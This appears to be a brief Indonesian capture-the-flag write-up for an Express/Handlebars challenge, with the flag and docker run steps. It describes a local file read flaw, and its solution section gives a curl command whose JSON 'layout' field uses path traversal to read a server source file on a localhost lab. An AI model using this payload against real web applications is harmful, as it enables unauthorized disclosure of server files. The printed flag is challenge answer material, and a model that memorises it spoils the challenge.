# express-handlebars

# Description
Ketika menggunakan ExpressJS lalu menggunakan Handlebars untuk templating, Anda mungkin rentan terhadap pembacan file lokal.

# Solution
Jalankan terminal lalu jalankan command ini:
curl -X 'POST' -H 'Content-Type: application/json' --data-binary $'{\"teks\":{"layout\": \"./../routes/index.js\"}}' 'http://localhost:9090/'

# Flag
FindITCTF{m3t_3id_mub4r4k}

# Author
repalfarel#0466

# How to Run?
```
docker build -t teks
docker run -p 9090:9090 teks
```